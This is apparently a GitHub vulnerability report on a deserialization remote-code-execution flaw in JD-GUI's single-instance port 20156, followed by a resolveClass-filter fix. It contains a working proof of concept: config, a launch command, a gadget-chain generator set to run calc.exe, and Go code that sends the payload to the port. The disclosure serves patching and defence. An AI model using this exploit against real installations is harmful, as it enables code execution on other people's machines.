| RCE Vulnerability in JD-GUI Description: When user open `UIMainWindowPreferencesProvider.singleInstance` config and use JDK 8u20/7u21, there will be an RCE vulnerability through deserialization on port 20156.  **CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H (Moderate 6.6)**  How to reproduce:  (1) Use single instance config in `jd-gui.cfg`  ``` <preferences> <JdGuiPreferences.errorBackgroundColor>0xFF6666</JdGuiPreferences.errorBackgroundColor> <JdGuiPreferences.jdCoreVersion>1.1.3</JdGuiPreferences.jdCoreVersion> <UIMainWindowPreferencesProvider.singleInstance>true</UIMainWindowPreferencesProvider.singleInstance> </preferences> ```  (2) Start jd-gui using JDK 8u20  ``` "C:\Program Files\Java\jdk1.8.0_20\bin\java.exe" -jar jd-gui-1.6.6.jar ```  (3) Make JDK 8u20 payload  <https://github.com/pwntester/JRE8u20_RCE_Gadget>  Modify the cmd in `ExploitGenerator#main`  ``` String command = "calc.exe"; ```  Run `ExploitGenerator#main` to generate payload (`exploit.ser`)  (4) Send binary data to 20156 port  ``` package main  import ( 	"fmt" 	"net" 	"os" )  func main() { 	payload, _ := os.ReadFile("exploit.ser") 	conn, err := net.Dial("tcp", "127.0.0.1:20156") 	_, err = conn.Write(payload) 	buf := make([]byte, 1024*10) 	_, err = conn.Read(buf) 	if err != nil { 		fmt.Println(err) 	} } ```  (5) RCE  Screenshot:  [image](https://user-images.githubusercontent.com/34726933/216638283-5c627cc5-3784-4bd2-a2d6-a9e0564d5bee.png)  (6) Fix  Use `resolveClass` method, only support String[]  ``` /*  * Copyright (c) 2008-2019 Emmanuel Dupuy.  * This project is distributed under the GPLv3 license.  * This is a Copyleft license that gives the user the right to use,  * copy and modify the code freely for non-commercial purposes.  */  package org.jd.gui.util.net;  import org.jd.gui.util.exception.ExceptionUtil;  import java.io.*; import java.net.InetAddress; import java.net.ServerSocket; import java.net.Socket; import java.util.function.Consumer;  public class InterProcessCommunicationUtil {      static class FilterObjectInputStream extends ObjectInputStream {          public FilterObjectInputStream(InputStream in) throws IOException {             super(in);         }          @Override         protected Class<?> resolveClass(final ObjectStreamClass classDesc) throws IOException, ClassNotFoundException {             if (classDesc.getName().equals("[Ljava.lang.String;")) {                 return super.resolveClass(classDesc);             }             throw new RuntimeException(String.format("not support class: %s",classDesc.getName()));         }     }      protected static final int PORT = 2015_6;      public static void listen(final Consumer<String[]> consumer) throws Exception {         final ServerSocket listener = new ServerSocket(PORT);          Runnable runnable = new Runnable() {             @Override             public void run() {                 while (true) {                     try (Socket socket = listener.accept();                          ObjectInputStream ois = new FilterObjectInputStream(socket.getInputStream())) {                         // Receive args from another JD-GUI instance                         String[] args = (String[])ois.readObject();                         consumer.accept(args);                     } catch (IOException|ClassNotFoundException e) {                         assert ExceptionUtil.printStackTrace(e);                     }                 }             }         };          new Thread(runnable).start();     }      public static void send(String[] args) {         try (Socket socket = new Socket(InetAddress.getLocalHost(), PORT);              ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream())) {             // Send args to the main JD-GUI instance             oos.writeObject(args);         } catch (IOException e) {             assert ExceptionUtil.printStackTrace(e);         }     } } ```  Screenshot:  [image](https://user-images.githubusercontent.com/34726933/216641077-92f76292-e356-4cd1-8bb3-737c4d17aa46.png) |
